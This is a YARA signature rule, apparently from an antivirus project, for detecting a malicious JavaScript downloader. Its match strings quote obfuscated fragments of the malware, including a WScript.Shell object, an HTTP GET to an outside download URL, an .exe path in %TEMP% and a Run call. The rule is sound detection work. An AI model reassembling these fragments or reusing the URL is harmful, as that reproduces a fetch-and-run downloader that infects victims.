rule sig_20160328_25e48eb875d118d20da49ecca735dd1a {
  meta:
    description = "datamaliciousorder - file 20160328_25e48eb875d118d20da49ecca735dd1a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6c11a7e96bda9b9e908b058620405a2273e2c079bcd31343b3e8c92426e7c063"

  strings:
    $s1  = "function Enzqnjjrv() {return Locdpywtd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"JNR9PXWdI.exe\";};" fullword ascii
    $s2  = "Rmxuumzudj[Yvbejsk](\"GET\", \"http://bombers-original.com/mdj6sf\", false);" fullword ascii
    $s3  = "do {WScript[Yxoetztglg](Puxnsx() * 11)} while (Rmxuumzudj[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Whneoefv(Ipwkjmlez, Xjekzri){return Ipwkjmlez - Xjekzri;};" fullword ascii
    $s5  = "function Dhqlp() {return ((Uheftpgm == true) && (Uheftpgm == Uvfmjsn)) ? 1 : Vgcgyvnq;};" fullword ascii
    $s6  = "var Locdpywtd = function Zsgyxaookp() {return WScript[Vxygm](\"WScript.Shell\");}();" fullword ascii
    $s7  = "var Uheftpgm = false;" fullword ascii
    $s8  = "Uheftpgm = true; " fullword ascii
    $s9  = "function Mkfkbfp(Sqiki){Locdpywtd[\"Run\"](Sqiki, Vgcgyvnq, Vgcgyvnq);};" fullword ascii
    $s10 = "Uvfmjsn = true; " fullword ascii
    $s11 = "var Enyynyqc = new this[\"Date\"]();" fullword ascii
    $s12 = "function Xpwywmtj()" fullword ascii
    $s13 = "function Fcdopp(){return Vxygm;};" fullword ascii
    $s14 = "function Rdkjjydk(){return Gslhyvo;};" fullword ascii
    $s15 = "function Wsxkm(Svznmpjnrf) {var Qpqwulmhd = (1, 2, 3, 4, 5, Svznmpjnrf); return Qpqwulmhd;};" fullword ascii
    $s16 = "function Puxnsx(){return 22;};" fullword ascii
    $s17 = "return Whneoefv(Smrarfaeb, Ktkjsxbi);" fullword ascii
    $s18 = "var Bicrefqra = false;" fullword ascii
    $s19 = "var Uvfmjsn = false;" fullword ascii
    $s20 = " while (Wkexbfkld){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}